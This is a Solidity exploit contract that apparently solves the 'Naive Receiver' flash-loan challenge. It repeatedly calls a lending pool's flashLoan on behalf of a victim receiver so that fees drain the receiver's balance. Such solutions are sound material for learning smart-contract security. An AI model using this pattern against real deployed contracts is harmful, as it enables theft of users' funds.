// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    NaiveReceiverLenderPool public pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address _receiver, address _token) external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(IERC3156FlashBorrower(_receiver), _token, 0, "");
        }
    }
}
